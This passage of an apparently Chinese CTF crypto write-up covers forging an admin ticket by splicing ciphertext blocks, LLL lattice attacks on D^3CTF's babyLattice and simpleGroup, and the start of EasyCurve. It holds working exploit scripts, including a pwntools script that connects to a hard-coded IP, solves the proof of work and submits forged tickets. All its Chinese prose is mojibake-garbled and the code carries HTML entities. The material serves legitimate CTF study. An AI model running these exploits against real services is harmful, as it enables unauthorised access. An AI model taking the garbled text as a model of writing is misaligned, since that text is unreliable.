ä¸º0åˆ°128ä¹‹é—´æ‰¾ä¸€ä¸ªå­—ç¬¦*ï¼Œè®©*dministratorçš„sha256çš„é¦–ä½ä¸ºeå°±å¯ä»¥äº†ã€‚ç»è¿‡æµ‹è¯•ï¼Œå­—ç¬¦â€˜Pâ€™å°±æ˜¯ä¸€ä¸ªåˆé€‚çš„å€¼\nimage-20201102234733848\nçœ‹ï¼Œä¸Šé¢æ˜¯ç›®æ ‡Authï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ç”¨æˆ·åå’Œcmdè·å–çš„Authï¼Œä»–ä»¬æ˜¯ä¸€è‡´çš„ã€‚æ‰€ä»¥Authè¿™ä¸€å…³è¿‡äº†ã€‚é‚£å°±åªå‰©ä¸‹å¯†æ–‡çš„ä¼ªé€ äº†ã€‚\nå¯¹äºç¬¬ä¸€ç»„ï¼Œæ˜¯ç”±uidå’Œç”¨æˆ·åå†³å®šçš„ã€‚å…¶ä¸­uidä¸ç”¨ä¼ªé€ ï¼Œé—®é¢˜ä¸å¤§ï¼Œä½†æ˜¯ç”¨æˆ·åçš„å¯†æ–‡å’‹åŠï¼Œæˆ‘ä»¬ç”¨æˆ·åä¸èƒ½ç­‰äºAdministratorï¼Œä½†æ˜¯åˆè¦æåˆ°çš„Administratorçš„å¯†æ–‡ã€‚\nè¿™é‡Œç”¨åˆ°çš„ç¬¬ä¸€æŠ€å·§å°±æ˜¯ï¼Œå¢åŠ uidçš„é•¿åº¦ï¼Œåæ­£uidæœ€åæ¨¡16äº†ï¼Œæˆ‘ä»¬æ§åˆ¶uidé•¿åº¦ä¸º5ï¼Œç”¨æˆ·åä¸ºAdministratorrï¼ˆå¤šäº†ä¸€ä¸ªrï¼‰ï¼Œè¿™æ ·å­å¯¹ç…§ä¸€ä¸‹ï¼Œ\nimage-20201102235135632\nå¯ä»¥å‘ç°ï¼Œå¤šå‡ºæ¥çš„é‚£ä¸ªræ­£å¥½è¢«æŒ¤åˆ°ç¬¬ä¸‰ç»„å»äº†ï¼Œè¿™æ ·å­æˆ‘ä»¬çš„ç”¨æˆ·åæ—¢æ²¡æœ‰ç­‰äºAdministratorï¼Œä½†æ˜¯åˆè·å¾—äº†å‰ä¸¤å—å±äºAdministratorçš„msgçš„å¯†æ–‡ã€‚\nokã€‚ä¸€åŠçš„å·¥ä½œå®Œæˆã€‚\nç¬¬äºŒç»„ï¼Œç”±äºuidé‚£ä¹ˆæ„é€ äº†ï¼Œé‚£ä¹ˆç¬¬äºŒç»„æ˜æ–‡å°±æ˜¯è¿™æ ·å­çš„ï¼Œb'r\\xffT=ab86207b\\xffCmd', b'=Give_Me_Flag\\xffç”±hashå’Œcmdå’Œç»„æˆï¼ˆè¿™é‡Œåªæ˜¯æµ‹è¯•ï¼Œé™„åŠ ä¿¡æ¯å°±å…ˆä¸åŠ äº†ï¼‰ã€‚\nè¿™é‡Œæˆ‘ä»¬è¦çš„æ˜¯cmd=Give_Me_Flagçš„å¯†æ–‡ï¼Œæ€ä¹ˆä¼ªé€ cmdå‘¢ï¼Ÿæˆ‘ä»¬ä¸èƒ½æ”¹å˜ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼Œä¸ç„¶ç”±äºAESçš„å­˜åœ¨ï¼Œå¯†æ–‡æ•´ä¸ªå°±ä¸ä¸€æ ·äº†ã€‚ä½†æ˜¯è¾“å…¥çš„cmdåˆä¸èƒ½ç­‰äºGive_Me_Flagã€‚è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç”¨å‰é¢çš„æ–¹æ³•ï¼Œç”±äºè¿™é‡Œåˆ†ç»„åŠ å¯†çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬æŠŠcmdé¡¶åˆ°ç¬¬äºŒå—çš„æœ«å°¾ï¼Œå¤§æ¦‚å°±æ˜¯è®©ç¬¬äºŒç»„çš„ç¬¬äºŒå—æ˜æ–‡æ˜¯è¿™æ ·å­ï¼Œ\n\u0026#39;Cmd=Give_Me_Flag\u0026#39; åˆšå¥½16ä¸ªå­—èŠ‚ï¼Œç„¶åæˆ‘ä»¬çš„å‘½ä»¤å°±å¯ä»¥æ”¹æˆGive_Me_Flaggï¼Œå¤šçš„gåˆ°ç¬¬äº”å—å»äº†ï¼Œå’±ä»¬å°±ä¸ç”¨ç®¡äº†ã€‚è‡³äºæ€ä¹ˆé¡¶ï¼Œè¿™é‡Œå°±è¦åˆ©ç”¨uidäº†ï¼Œåœ¨uidé•¿åº¦ä»ç„¶ä¿æŒä¸º5çš„æƒ…å†µä¸‹ï¼Œè¿›è¡ŒåŠ å‡ï¼Œæ§åˆ¶hashçš„é•¿åº¦ä¸º12å°±å¥½äº†ï¼Œ11111%16 = 7ï¼Œé‚£å°±ç”¨11116ï¼Œ\nimage-20201218133935540\nå¯ä»¥çœ‹åˆ°è¿™æ ·\\xffT=4110a98d23fc\\xffåˆšå¥½å æ»¡äº†ç¬¬äºŒç»„ç¬¬ä¸€å—çš„16å­—èŠ‚ï¼Œ'Cmd=Give_Me_Flagå äº†å¦ä¸€å—ã€‚è€Œæˆ‘ä»¬è¾“å…¥çš„cmdå‘½ä»¤æ˜¯Give_Me_Flaggï¼Œæ˜¯èƒ½è¿‡éªŒè¯çš„ã€‚è¿™æ ·äº¤äº’ï¼Œè®©ä»–åŠ å¯†ï¼Œå°±èƒ½å¾—åˆ°æ˜æ–‡ï¼šb'\\xffT=4110a98d23fc\\xff', b'Cmd=Give_Me_Flag'ç”Ÿæˆçš„å¯†æ–‡äº†ã€‚ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œhashç”±ç”¨æˆ·åæ§åˆ¶ï¼Œç”¨æˆ·åä¸ºAdministratorçš„12ä½hashæ˜¯e7d3e769f3f5ï¼Œç„¶è€Œæˆ‘ä»¬åˆä¸èƒ½æ³¨å†Œç”¨æˆ·ä¸ºAdministratorï¼Œé‚£ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ï¼Œç¢°æ’ï¼Œæ‰¾ä¸€ä¸ªç”±å¯è§å­—ç¬¦ä¸²ç»„æˆçš„13ä½å­—ç¬¦ä¸²ï¼ˆAdministratorçš„é•¿åº¦ï¼‰ï¼Œsha256åå‰12ä½ä¸ºe7d3e769f3f5å°±å¯ä»¥äº†ã€‚ç„¶è€Œè¿™æ˜¾ç„¶ä¸ç°å®ï¼Œ12ä½æ˜¯96bitï¼Œæœ‰è¿™ç®—åŠ›ï¼Œæ¯”ç‰¹å¸ä¸æ˜¯éšä¾¿æŒ–ï¼Ÿæ‰€ä»¥è¿™é¢˜æœ‰è§£çš„ä¸€ä¸ªåŸå› å°±æ˜¯ï¼Œè¿™ä¸ªç³»ç»Ÿå¹¶æ²¡æœ‰éªŒè¯ç”¨æˆ·åçš„hashï¼Œæ‰€ä»¥ä½ éšä¾¿æ•´ä¸ªç”¨æˆ·åå°±å¥½(æˆ‘ä»¬è¿™é‡Œå°±ç”¨çš„Administratos)ã€‚\nä½†æ˜¯æ–°é—®é¢˜äº§ç”Ÿäº†ï¼ŒAuthçš„è·å–æ€ä¹ˆåŠï¼Ÿç°åœ¨æˆ‘ä»¬çš„uid=11116ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç”¨æˆ·åä¸ºAdministratorï¼Œcmdä¸ºGive_Me_Flagçš„æƒ…å†µ\nimage-20201103001239680\næƒ³è¦å¾—åˆ°Authï¼Œå°±å¾—æ„é€ åŒæ ·çš„ç¬¬äºŒå—ã€ç¬¬å››å—æ˜æ–‡ï¼Œç¬¬äºŒå—æ˜æ–‡è¿˜å¥½è¯´ï¼Œç”¨æˆ·åæˆ‘ä»¬å¤šæ‰“ä¸€ä¸ªå­—ç¬¦å°±èƒ½ç»•è¿‡æ£€æŸ¥äº†ï¼Œè€Œè¿™ä¸ªå­—ç¬¦ä¹Ÿä¼šè¢«é¡¶åˆ°ç¬¬ä¸‰å—ï¼Œå¯¹Authæ²¡æœ‰å½±å“ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥uidç›¸åº”çš„å‡1ï¼Œè®©ç¬¬å››å—å¯†æ–‡ä¸å—åˆ°å½±å“ã€‚ä½†æ˜¯ç¬¬å››å—çš„æ˜æ–‡æœ¬èº«å°±ä¸å¥½æ“ä½œå•Šï¼Œè¿™é‡Œè¦æ˜¯ä¹Ÿå¤šæ‰“ä¸€ä¸ªå­—ç¬¦ç»•è¿‡çš„è¯ï¼Œç¬¬äº”ç»„å°±å¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·äº§ç”Ÿçš„Authå°±å®Œå…¨å¯¹ä¸ä¸Šäº†ã€‚\næ‰€ä»¥è¦æŠŠè¯è·å–åˆ°æ­£ç¡®çš„Authï¼Œæˆ‘ä»¬éœ€è¦ç¬¬äºŒå—ï¼Œç¬¬å››å—ï¼Œç¬¬äº”å—åˆ†åˆ«ä¸ºï¼šb'me=Administrator', b'Cmd=Give_Me_Flag', b'\\xff'\nè¿™é‡Œæˆ‘çš„åšæ³•æ˜¯ï¼Œç¼©çŸ­uidä¸ºä¸¤ä½é•¿ï¼Œæ„é€ ç”¨æˆ·åä¸ºï¼šme=Administratorï¼Œæ§åˆ¶uid%16ä¸º8ï¼Œæ„é€ cmdä¸ºCmd=Give_Me_Flag\nimage-20201103002724699\nå¯ä»¥çœ‹åˆ°æ˜¯å®Œå…¨ä¸€è‡´çš„ã€‚å¦‚æœæ­¤æ—¶æ‰“å°å‡ºæ¥äº†C_listçš„è¯ï¼Œä¹Ÿä¼šå‘ç°ï¼Œæ­¤æ—¶è¿™ä¸¤ç»„äº§ç”Ÿçš„C_listçš„æœ€åä¸€ç»„ä¹Ÿæ˜¯ä¸€è‡´çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡ŒM_listçš„åˆ°æ•°ä¸¤ç»„æ˜¯ä¸€è‡´çš„ã€‚\nè§£é¢˜æµç¨‹ # æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼šï¼ˆäº¤äº’å¯ä»¥ç›´æ¥æ‰‹æ’¸ï¼‰\nuidï¼š24ï¼Œnameï¼šme=Administratorï¼Œcmdï¼šCmd=Give_Me_Flag è·å–Authå’Œç¬¬ä¸‰æ®µå¯†æ–‡ uidï¼š11116ï¼Œnameï¼šme=Administratorrï¼Œåé¢éšæ„ è·å–ç¬¬ä¸€æ®µå¯†æ–‡ uidï¼š11116ï¼Œnameï¼šAdministratosï¼Œcmdï¼šGive_Me_Flagg è·å–ç¬¬äºŒæ®µå¯†æ–‡ å‘é€Authå’Œä¸‰æ®µå¯†æ–‡çš„æ‹¼æ¥ï¼Œè·å–flag exp\nfrom pwn import * sh=remote(\u0026#34;123.57.4.93\u0026#34;,\u0026#34;45216\u0026#34;) from pwnlib.util.iters import mbruteforce from hashlib import sha256 context.log_level = \u0026#39;debug\u0026#39; def proof_of_work(sh): sh.recvuntil(\u0026#34;XXXX+b\\\u0026#39;\u0026#34;) suffix = sh.recvuntil(\u0026#34;\\\u0026#39;\u0026#34;).decode(\u0026#34;utf8\u0026#34;)[:-1] log.success(suffix) sh.recvuntil(\u0026#34;== b\\\u0026#39;\u0026#34;) cipher = sh.recvuntil(\u0026#34;\\\u0026#39;\u0026#34;).decode(\u0026#34;utf8\u0026#34;)[:-1] print(suffix) print(cipher) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method=\u0026#39;fixed\u0026#39;) sh.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) proof_of_work(sh) sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;1\u0026#39;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#39;24\u0026#39;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;me=Administrator\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Cmd=Give_Me_Flag\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;Auth:\u0026#34;) Auth=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#34;1\u0026#34;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#34;65548\u0026#34;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;Administratorr\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Give_Me_Flagg\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket1=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;1\u0026#39;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#39;65548\u0026#39;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;Administratos\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Give_Me_Flagg\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket2=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;2\u0026#39;) sh.recvuntil(\u0026#34;Ticket:\u0026#34;) sh.sendline(ticket1[:64]+ticket2[64:64*2]+ticket[-2:]) sh.recvuntil(\u0026#34;Auth:\u0026#34;) sh.sendline(Auth) sh.interactive() 2021 AntCTF x D^3CTF # babyLattice # é¢˜ç›®åˆ†æ # è¿™é“é¢˜çš„é¢˜ç›®å¦‚ä¸‹\nfrom collections import namedtuple PublicKey = namedtuple(\u0026#39;PublicKey\u0026#39;, [\u0026#39;n\u0026#39;, \u0026#39;b\u0026#39;]) SecretKey = namedtuple(\u0026#39;SecretKey\u0026#39;, [\u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;A\u0026#39;]) def gen_key(): p = random_prime(2^512, lbound=2^511) q = random_prime(2^512, lbound=2^511) n = p * q a11, a12, a21 = [random_prime(2^100) for _ in range(3)] a22 = random_prime(2^100) while a11 * a22 == a12 * a21: a22 = random_prime(2^100) A = Matrix(ZZ, [[a11, a12], [a21, a22]]) a1 = crt([a11, a21], [p, q]) a2 = crt([a12, a22], [p, q]) b = a1 * inverse_mod(a2, n) % n PK = PublicKey(n, b) SK = SecretKey(p, q, A) return (PK, SK) def encrypt(m, pk): assert 0 \u0026lt; m \u0026lt; 2^400 r = randint(0, 2^400-1) c = (pk.b*m + r) % pk.n return c def decrypt(c, sk): a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q]) s1 = a2 * c % sk.p s2 = a2 * c % sk.q m, r = sk.A.solve_right(vector([s1, s2])) return m def test(pk, sk, num=3): for _ in range(num): m = randint(0, 2^400-1) c = encrypt(m, pk) mm = decrypt(c, sk) assert m == mm if __name__ == \u0026#39;__main__\u0026#39;: from hashlib import sha256 from secret import m, FLAG assert FLAG == \u0026#39;d3ctf\u0026#39; % sha256(int(m).to_bytes(50, \u0026#39;big\u0026#39;)).hexdigest() PK, SK = gen_key() test(PK, SK) c = encrypt(m, PK) print(f\u0026#34;PK = {PK}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) æˆ‘ä»¬é‡ç‚¹çœ‹çœ‹åŠ å¯†å‡½æ•°\nä¹Ÿå°±æ˜¯\nè¿™æ ·å°±å¯ä»¥é€šè¿‡LLLç®—æ³•è¿˜åŸå‡ºmäº†\nEXP # from hashlib import sha256 n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570 A = Matrix(ZZ,[[1,0,b],[0,2^400,c],[0,0,n]]) A = A.LLL() m = int(A[0][0]) flag = \u0026#39;d3ctf\u0026#39; % sha256(int(m).to_bytes(50, \u0026#39;big\u0026#39;)).hexdigest() print(flag) simpleGroup # é¢˜ç›®åˆ†æ # è¿™é“é¢˜çš„é¢˜ç›®å¦‚ä¸‹\nfrom random import randint from secret import FLAG # A gift for key recovery in challenge [babyLattice] n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 e = 1928983487 M = int.from_bytes(FLAG, \u0026#39;big\u0026#39;) C = [] while M != 0: m = M % e M //= e r = randint(0, n-1) c = power_mod(y, m, n) * power_mod(r, e, n) C.append(c % n) print(f\u0026#34;C = {C}\u0026#34;) é€šè¿‡æ³¨é‡Šæˆ‘ä»¬å¯ä»¥å¤§æ¦‚çŒœæµ‹babyLatticeæœ¬æ¥æ˜¯éœ€è¦åˆ†è§£nçš„ï¼Œä½†æ˜¯å› ä¸ºè¢«éé¢„æœŸäº†æ‰€ä»¥åˆå‡ºäº†è¿™é“é¢˜ç›®\né‚£ä¹ˆæˆ‘ä»¬å›åˆ°babyLatticeé¢˜ç›®é‡Œé¢ï¼Œæˆ‘ä»¬çŸ¥é“çš„å‚æ•°å®é™…ä¸Šåªæœ‰b,c,nï¼Œåˆ†è§£nåº”è¯¥å’Œbæœ‰å…³ï¼Œé€šè¿‡é˜…è¯»bçš„ç”Ÿæˆä»£ç æˆ‘ä»¬å¯ä»¥å¾—åˆ°\næˆ‘ä»¬å±•å¼€åä¸¤ä¸ªå¼å­\nä¹Ÿå°±æ˜¯\nä¸¤è¾¹ç›¸ä¹˜å¾—åˆ°\nå±•å¼€å¹¶å˜å½¢å¾—åˆ°\nä¹Ÿå°±æ˜¯\nç”±äº\næ‰€ä»¥æˆ‘ä»¬åŒæ ·å¯ä»¥ç”¨LLLè¿˜åŸå‡ºç›®æ ‡å‘é‡ï¼Œç„¶åä½¿ç”¨factorè¿›è¡Œåˆ†è§£ï¼ˆa11,a12,a21,a22å®ƒä»¬éƒ½æ˜¯ç´ æ•°ï¼‰\nå½“åˆ†è§£å®Œæ¯•åï¼Œé€šè¿‡çŒœæµ‹å®ƒä»¬å¯¹åº”çš„å€¼æ¥åˆ†è§£nï¼Œå³\nå¾—åˆ°p,qåï¼Œæˆ‘ä»¬å›æ¥çœ‹é¢˜ç›®é‡Œé¢çš„åŠ å¯†ï¼Œå…¶ä¼šå¯¹FLAGè¿›è¡Œå–æ¨¡å¹¶åˆ†æ®µåŠ å¯†ä½™æ•°ï¼Œå…¶ä¸­cçš„ç”Ÿæˆå…¬å¼å¦‚ä¸‹\nræ˜¯éšæœºç”Ÿæˆçš„æ•°å­—ï¼Œè€Œeå¯ä»¥è¢«åˆ†è§£ä¸ºe1å’Œe2ä¸¤ä¸ªç´ æ•°ï¼Œè¿™ä¸¤ä¸ªç´ æ•°åˆåˆ†åˆ«æ˜¯p-1å’Œq-1çš„å› å­\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ°\né€šè¿‡éå†jå¹¶åˆ¤æ–­å¾—åˆ°çš„c'æ˜¯ä¸æ˜¯ä¸ºæ¨¡pçš„e1æ¬¡å‰©ä½™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°mæ¨¡e1çš„å€¼\nåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨qå¾—åˆ°mæ¨¡e2çš„å€¼ï¼Œç„¶åä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†å³å¯è¿˜åŸmå¹¶æœ€ç»ˆå¾—åˆ°flag\nEXP # n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570 A = Matrix(ZZ,[[1,0,b^2],[0,1,b],[0,0,n]]) A = A.LLL() x1 = -A[0][0] x3 = A[0][2] print(factor(x1)) print(factor(x3)) a12 = 1018979931854255696816714991181 a22 = 1151291153120610849180830073509 a11 = 1017199123798810531137951821909 a21 = 207806651167586080788016046729 print(gcd(b * a12 - a11,n)) print(gcd(b * a22 - a21,n)) p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 assert(p * q == n) #!/usr/bin/env python from Crypto.Util.number import * import gmpy2 p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 e = 1928983487 e1 = 36493 e2 = 52859 def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) def check(d,p,n): if((p - 1) % n == 0): return pow(d,(p - 1) // n,p) == 1 else: k = gmpy2.gcd(n, p - 1) return pow(d,(p - 1) // k,p) == 1 def getM(c,e,p): for i in range(2,e): tmpc = (c * gmpy2.invert(pow(y,i,p),p)) % p if check(tmpc,p,e): return i exit(0) C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428] m = 0 for c in C[::-1]: cp = c % p cq = c % q m1 = getM(cp,e1,p) m2 = getM(cq,e2,q) mm,lcm = GCRT([e1,e2],[m1,m2]) print(\u0026#34;Get mm: \u0026#34; + hex(mm)) m *= e m += mm flag = long_to_bytes(m) print(flag) EasyCurve # é¢˜ç›®åˆ†æ # è¿™é“é¢˜ç›®çš„ä¸»è¦éƒ¨åˆ†å¦‚ä¸‹\nimport socketserver from Crypto.PublicKey import RSA from Crypto.Util.number import getPrime , bytes_to_long from Curve import MyCurve from hashlib import sha256 import os import string import random import signal from secret import flag BIT = 2048 p = 9688074905643914060390149833064012354277254244638141162997888145741631958242340092013958501673928921327767591959476890238698855704376126231923819603296257 class Task(socketserver.BaseRequestHandler): def proof_of_work(self): random.seed(os.urandom(8)) proof = \u0026#39;\u0026#39;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f\u0026#34;sha256(XXXX+{proof[4:]}) == {_hexdigest}\u0026#34;.encode()) self.send(b\u0026#39;Give me XXXX: \u0026#39;) x = self.recv() if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: self.send(\u0026#39;wrong\u0026#39;) return False return True def recv(self): data = self.request.recv(1024) return data.strip() def send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def key_gen(self , bit): key = RSA.generate(bit) return key def ot(self , point): x , y = point random.seed(os.urandom(8)) key = self.key_gen(BIT) self.send(\u0026#39;n = \u0026#39; + str(key.n)) self.send(\u0026#39;e = \u0026#39; + str(key.e)) x0 = random.randint(1 , key.n) x1 = random.randint(1 , key.n) self.send(\u0026#34;x0 = \u0026#34; + str(x0)) self.send(\u0026#34;x1 = \u0026#34; + str(x1)) self.send(\u0026#34;v = \u0026#34;) v = int(self.recv()) m0_ = (x + pow(v - x0, key.d, key.n)) % key.n m1_ = (y + pow(v - x1, key.d, key.n)) % key.n self.send(\u0026#34;m0_ = \u0026#34; + str(m0_)) self.send(\u0026#34;m1_ = \u0026#34; + str(m1_)) def handle(self): signal.alarm(180) if not self.proof_of_work(): return 0 e = bytes_to_long(os.urandom(32)) u = random.randint(1 , p) D = random.randint(1 , p) curve = MyCurve(p , D , u) self.send(\u0026#39;p = \u0026#39; + str(p)) self.send(\u0026#39;D = \u0026#39; + str(D)) for i in range(3): G = curve.getPoint() self.ot(G) P = curve.mul(e , G) self.ot(P) self.send(\u0026#34;do you know my e?\u0026#34;) guess = int(self.recv()) if guess == e: self.send(\u0026#34;oh no!\u0026#34;) self.send(flag) return 0 else: self.send(\u0026#34;Ha, I know you can\u0026#39;t get it.\u0026#34;) class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10000 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() å…¶ä½¿ç”¨äº†ä¸€ä¸ªéšæœºç”Ÿæˆå‚æ•°çš„MyCurveå¹¶ç”Ÿæˆäº†éšæœºçš„eï¼Œç»™æˆ‘ä»¬ä¸‰æ¬¡äº¤äº’çš„æœºä¼šï¼Œæ¯æ¬¡äº¤äº’ä¼šéšæœºç”Ÿæˆç‚¹Gå’Œç‚¹På¹¶ä½¿ç”¨OTå°†è¿™ä¸¤ä¸ªç‚¹çš„ä¿¡æ¯ä¼ 